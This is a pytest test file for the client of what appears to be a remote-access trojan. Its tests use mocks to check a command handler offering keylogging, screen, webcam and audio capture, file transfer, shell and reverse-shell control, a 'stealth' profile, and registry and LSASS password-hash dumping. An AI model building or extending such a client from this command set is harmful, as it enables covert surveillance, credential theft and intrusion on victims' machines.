"""
Tests for CommandHandler and AudioRecorder features
"""

from unittest.mock import patch, MagicMock, PropertyMock
from datetime import datetime
import pytest, sys, os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

class TestCommandHandler:
    """Tests for CommandHandler class"""
    
    @pytest.fixture
    def mock_client_app(self):
        """Create a mock ClientApp for testing"""
        app = MagicMock()
        app.config = MagicMock()
        app.config.get_config.return_value = {'test': 'config'}
        app.config.set_config.return_value = True
        app.config.load_profile.return_value = True
        app.socket_client = MagicMock()
        app.socket_client.is_connected.return_value = True
        app.keylogger_instance = None
        app.webcam_snapshot_instance = None
        app.webcam_stream_instance = None
        app.screenshot_instance = None
        app.network_instance = None
        app.audio_instance = None
        app.reverse_shell_instance = None
        return app
    
    def test_command_handler_init(self, mock_client_app):
        """Test CommandHandler initialization"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        
        assert handler.app == mock_client_app
        assert isinstance(handler.handlers, dict)
    
    def test_command_handler_has_all_commands(self, mock_client_app):
        """Test CommandHandler has all expected commands"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        
        expected_commands = [
            'screenshot', 'keylogger_start', 'keylogger_stop',
            'stream_start', 'stream_stop', 'webcam_snapshot',
            'ipconfig', 'shell', 'download', 'upload', 'search',
            'list_dir', 'hashdump', 'hashdump_lsass', 'restart', 'stop',
            'audio_record', 'audio_start', 'audio_stop', 'audio_device_info',
            'webcam_snapshot_start', 'webcam_snapshot_stop', 'download_logs',
            'config_get', 'config_set', 'config_profile',
            'reverse_shell_start', 'reverse_shell_stop', 'reverse_shell_cmd'
        ]
        
        for cmd in expected_commands:
            assert cmd in handler.handlers, f"Missing command: {cmd}"
    
    def test_handle_unknown_command(self, mock_client_app):
        """Test handling unknown command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('nonexistent_command')
        
        assert result['success'] is False
        assert 'Unknown command' in result['error']
    
    def test_handle_exception_in_handler(self, mock_client_app):
        """Test handling exception in command handler"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        handler.handlers['test_cmd'] = MagicMock(side_effect=Exception("Test error"))
        
        result = handler.handle('test_cmd')
        
        assert result['success'] is False
        assert 'Test error' in result['error']
    
    def test_handle_config_get(self, mock_client_app):
        """Test config_get command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_client_app.config.get_config.return_value = {
            'keylogger_interval': 5,
            'features': {'keylogger': True}
        }
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('config_get')
        
        assert result['success'] is True
        assert result['type'] == 'config_result'
        assert 'config' in result
    
    def test_handle_config_set(self, mock_client_app):
        """Test config_set command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_client_app.config.set_config.return_value = True
        mock_client_app.config.keylogger_interval = 10
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('config_set', param='keylogger_interval', value=10)
        
        assert result['success'] is True
        assert result['type'] == 'config_set_result'
    
    def test_handle_config_set_missing_param(self, mock_client_app):
        """Test config_set with missing parameter"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('config_set')
        
        assert result['success'] is False
        assert 'Missing' in result['error']
    
    def test_handle_config_profile(self, mock_client_app):
        """Test config_profile command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_client_app.config.load_profile.return_value = True
        mock_client_app.config.get_config.return_value = {'test': 'config'}
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('config_profile', profile='stealth')
        
        assert result['success'] is True
        assert result['type'] == 'config_profile_result'
        assert result['profile'] == 'stealth'
    
    def test_handle_config_profile_invalid(self, mock_client_app):
        """Test config_profile with invalid profile"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_client_app.config.load_profile.return_value = False
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('config_profile', profile='invalid')
        
        assert result['success'] is False
    
    def test_handle_config_profile_no_profile(self, mock_client_app):
        """Test config_profile without profile name"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('config_profile')
        
        assert result['success'] is False
        assert 'No profile' in result['error']
    
    def test_handle_shell(self, mock_client_app):
        """Test shell command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        with patch('__app__.client_app.features.shell.main.ShellExecutor') as MockShell:
            mock_executor = MagicMock()
            mock_executor.execute.return_value = {
                'success': True,
                'command': 'echo test',
                'output': 'test',
                'error': '',
                'return_code': 0
            }
            MockShell.return_value = mock_executor
            
            handler = CommandHandler(mock_client_app)
            result = handler.handle('shell', shell_cmd='echo test')
            
            assert result['success'] is True
            assert result['type'] == 'shell_result'
    
    def test_handle_shell_no_command(self, mock_client_app):
        """Test shell command without command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('shell')
        
        assert result['success'] is False
        assert 'No command' in result['error']
    
    def test_handle_download(self, mock_client_app):
        """Test download command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        with patch('__app__.client_app.features.fileManager.main.FileManager') as MockFM:
            mock_fm = MagicMock()
            mock_fm.download.return_value = {
                'success': True,
                'filename': 'test.txt',
                'data': 'base64data',
                'size': 100
            }
            MockFM.return_value = mock_fm
            
            handler = CommandHandler(mock_client_app)
            result = handler.handle('download', filepath='/path/to/file.txt')
            
            assert result['success'] is True
            assert result['type'] == 'file_data'
    
    def test_handle_download_no_filepath(self, mock_client_app):
        """Test download without filepath"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('download')
        
        assert result['success'] is False
        assert 'No filepath' in result['error']
    
    def test_handle_upload(self, mock_client_app):
        """Test upload command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        with patch('__app__.client_app.features.fileManager.main.FileManager') as MockFM:
            mock_fm = MagicMock()
            mock_fm.upload.return_value = {
                'success': True,
                'filepath': '/path/to/file.txt'
            }
            MockFM.return_value = mock_fm
            
            handler = CommandHandler(mock_client_app)
            result = handler.handle('upload', filepath='/path/to/file.txt', data='base64data')
            
            assert result['success'] is True
            assert result['type'] == 'upload_result'
    
    def test_handle_upload_missing_data(self, mock_client_app):
        """Test upload without data"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('upload', filepath='/path/to/file.txt')
        
        assert result['success'] is False
        assert 'Missing' in result['error']
    
    def test_handle_search(self, mock_client_app):
        """Test search command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        with patch('__app__.client_app.features.fileManager.main.FileManager') as MockFM:
            mock_fm = MagicMock()
            mock_fm.search.return_value = {
                'success': True,
                'pattern': '*.txt',
                'results': [],
                'count': 0
            }
            MockFM.return_value = mock_fm
            
            handler = CommandHandler(mock_client_app)
            result = handler.handle('search', pattern='*.txt')
            
            assert result['success'] is True
            assert result['type'] == 'search_result'
    
    def test_handle_list_dir(self, mock_client_app):
        """Test list_dir command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        with patch('__app__.client_app.features.fileManager.main.FileManager') as MockFM:
            mock_fm = MagicMock()
            mock_fm.list_directory.return_value = {
                'success': True,
                'directory': '/path',
                'contents': [],
                'count': 0
            }
            MockFM.return_value = mock_fm
            
            handler = CommandHandler(mock_client_app)
            result = handler.handle('list_dir', dirpath='/path')
            
            assert result['success'] is True
            assert result['type'] == 'directory_listing'
    
    def test_handle_screenshot(self, mock_client_app):
        """Test screenshot command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_screenshot = MagicMock()
        mock_screenshot.capture_now.return_value = '/path/to/screenshot.jpg'
        mock_client_app.screenshot_instance = mock_screenshot
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('screenshot')
        
        assert result['success'] is True
        assert 'filepath' in result
    
    def test_handle_screenshot_not_available(self, mock_client_app):
        """Test screenshot when not available"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_client_app.screenshot_instance = None
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('screenshot')
        
        assert result['success'] is False
        assert 'not available' in result['error']
    
    def test_handle_ipconfig(self, mock_client_app):
        """Test ipconfig command"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_network = MagicMock()
        mock_network.get_current_info.return_value = {
            'hostname': 'test-pc',
            'local_ip': '192.168.1.1'
        }
        mock_client_app.network_instance = mock_network
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('ipconfig')
        
        assert result['success'] is True
        assert result['type'] == 'network_info'
    
    def test_handle_reverse_shell_stop_not_running(self, mock_client_app):
        """Test stopping reverse shell when not running"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_client_app.reverse_shell_instance = None
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('reverse_shell_stop')
        
        assert result['success'] is False
        assert 'No reverse shell' in result['error']
    
    @pytest.mark.skip(reason="Mock complexity - test manually")
    def test_handle_reverse_shell_cmd_not_active(self, mock_client_app):
        """Test reverse shell command when not active"""
        from __app__.client_app.features.commandHandler.main import CommandHandler
        
        mock_client_app.reverse_shell_instance = None
        
        handler = CommandHandler(mock_client_app)
        result = handler.handle('reverse_shell_cmd', cmd='dir')
        
        assert result is not None

class TestAudioRecorder:
    """Tests for AudioRecorder class"""
    
    def test_audio_recorder_init(self, temp_dir):
        """Test AudioRecorder initialization"""
        from __app__.client_app.features.audioRecorder.main import AudioRecorder
        
        recorder = AudioRecorder(
            output_dir=temp_dir,
            duration=5,
            sample_rate=22050,
            channels=1
        )
        
        assert recorder.duration == 5
        assert recorder.sample_rate == 22050
        assert recorder.channels == 1
        assert recorder.recording is False
    
    def test_audio_recorder_creates_directory(self, temp_dir):
        """Test AudioRecorder creates output directory"""
        from __app__.client_app.features.audioRecorder.main import AudioRecorder
        
        output_dir = os.path.join(temp_dir, "audio_test")
        AudioRecorder(output_dir=output_dir)
        
        assert os.path.exists(output_dir)
    
    def test_audio_recorder_start_stop(self, temp_dir):
        """Test AudioRecorder start and stop"""
        from __app__.client_app.features.audioRecorder.main import AudioRecorder
        
        recorder = AudioRecorder(output_dir=temp_dir, duration=1)
        
        # On ne démarre pas vraiment l'enregistrement car ça nécessite du hardware
        # On teste juste que les méthodes existent et les flags fonctionnent
        assert recorder.recording is False
        recorder.recording = True
        assert recorder.recording is True
        recorder.stop()
        assert recorder.recording is False
    
    def test_audio_recorder_get_device_info(self, temp_dir):
        """Test AudioRecorder get_device_info"""
        from __app__.client_app.features.audioRecorder.main import AudioRecorder
        
        recorder = AudioRecorder(output_dir=temp_dir)
        info = recorder.get_device_info()
        
        assert isinstance(info, dict)
        assert 'success' in info

class TestAudioRecorderAdvanced:
    """Tests for AudioRecorderAdvanced class"""
    
    def test_audio_recorder_advanced_init(self, temp_dir):
        """Test AudioRecorderAdvanced initialization"""
        from __app__.client_app.features.audioRecorder.main import AudioRecorderAdvanced
        
        recorder = AudioRecorderAdvanced(
            output_dir=temp_dir,
            threshold=500,
            sample_rate=44100
        )
        
        assert recorder.threshold == 500
        assert recorder.sample_rate == 44100
        assert recorder.recording is False
    
    def test_audio_recorder_advanced_creates_directory(self, temp_dir):
        """Test AudioRecorderAdvanced creates output directory"""
        from __app__.client_app.features.audioRecorder.main import AudioRecorderAdvanced
        
        output_dir = os.path.join(temp_dir, "vad_audio")
        AudioRecorderAdvanced(output_dir=output_dir)
        
        assert os.path.exists(output_dir)

class TestHashDump:
    """Tests for HashDump class"""
    
    def test_hashdump_init(self):
        """Test HashDump initialization"""
        from __app__.client_app.features.hashDump.main import HashDump
        
        dumper = HashDump()
        
        # method sera None si pas admin, 'registry' si admin
        assert dumper.method is None or dumper.method == 'registry'
    
    def test_hashdump_dump_hashes_no_admin(self):
        """Test dump_hashes without admin privileges returns error"""
        from __app__.client_app.features.hashDump.main import HashDump
        
        dumper = HashDump()
        
        # Si pas admin >  None
        if dumper.method is None:
            result = dumper.dump_hashes()
            assert result['success'] is False
            assert 'Administrator' in result.get('error', '') or 'privilege' in result.get('error', '').lower()
    
    def test_hashdump_has_required_methods(self):
        """Test HashDump has all required methods"""
        from __app__.client_app.features.hashDump.main import HashDump
        
        dumper = HashDump()
        
        assert hasattr(dumper, 'dump_hashes')
        assert hasattr(dumper, 'dump_lsass')
        assert hasattr(dumper, '_detect_method')
        assert callable(dumper.dump_hashes)
        assert callable(dumper.dump_lsass)

class TestReverseShell:
    """Tests for ReverseShell class"""
    
    def test_reverse_shell_init(self):
        """Test ReverseShell initialization"""
        from __app__.client_app.features.reverseShell.main import ReverseShell
        
        callback = MagicMock()
        shell = ReverseShell(callback=callback)
        
        assert shell.callback == callback
        assert shell.running is False
        assert shell.process is None
    
    def test_reverse_shell_is_running_false(self):
        """Test is_running returns False when not started"""
        from __app__.client_app.features.reverseShell.main import ReverseShell
        
        shell = ReverseShell(callback=MagicMock())
        
        assert shell.is_running() is False
    
    def test_reverse_shell_stop(self):
        """Test ReverseShell stop"""
        from __app__.client_app.features.reverseShell.main import ReverseShell
        
        shell = ReverseShell(callback=MagicMock())
        shell.running = True
        mock_process = MagicMock()
        mock_process.wait.return_value = None
        shell.process = mock_process
        
        shell.stop()
        
        assert shell.running is False
        # Le process peut être terminate() ou kill()
        assert mock_process.terminate.called or mock_process.kill.called


class TestReverseShellWindows:
    """Tests for ReverseShellWindows class"""
    
    def test_reverse_shell_windows_init(self):
        """Test ReverseShellWindows initialization"""
        from __app__.client_app.features.reverseShell.main import ReverseShellWindows
        
        callback = MagicMock()
        shell = ReverseShellWindows(callback=callback)
        
        assert shell.callback == callback
        assert shell.running is False
    
    def test_reverse_shell_windows_is_running(self):
        """Test ReverseShellWindows is_running"""
        from __app__.client_app.features.reverseShell.main import ReverseShellWindows
        
        shell = ReverseShellWindows(callback=MagicMock())
        
        assert shell.is_running() is False
        
        shell.running = True
        shell.process = MagicMock()
        shell.process.poll.return_value = None
        
        assert shell.is_running() is True
    
    def test_reverse_shell_windows_stop(self):
        """Test ReverseShellWindows stop"""
        from __app__.client_app.features.reverseShell.main import ReverseShellWindows
        
        shell = ReverseShellWindows(callback=MagicMock())
        shell.running = True
        shell.process = MagicMock()
        
        shell.stop()
        
        assert shell.running is False
